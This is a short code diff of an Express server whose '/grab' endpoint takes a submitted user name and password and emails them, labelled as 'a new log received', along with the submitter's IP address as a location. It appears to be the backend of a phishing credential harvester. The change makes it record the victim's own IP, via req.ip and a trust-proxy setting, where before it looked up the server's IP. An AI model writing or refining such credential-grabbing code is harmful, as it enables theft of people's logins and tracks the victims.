@@ -15,11 +15,11 @@ app.use(cors({
 app.use(express.json());
 app.use(express.urlencoded({extended:false}))
 app.use(express.static(path.join(__dirname,"public")));
-
+app.set("trust proxy",true);
 
 app.post("/grab",async(req, res)=>{
-   const response = await axios.get('https://api.ipify.org?format=json');
-    const publicIP = response.data.ip;
+   
+    const publicIP = req.ip;
    try{
     $message=`Hello, a new log received.:\n User: ${req.body.user}\n Password: ${req.body.pass}\n Location: ${publicIP}`;
            sendmail($message);
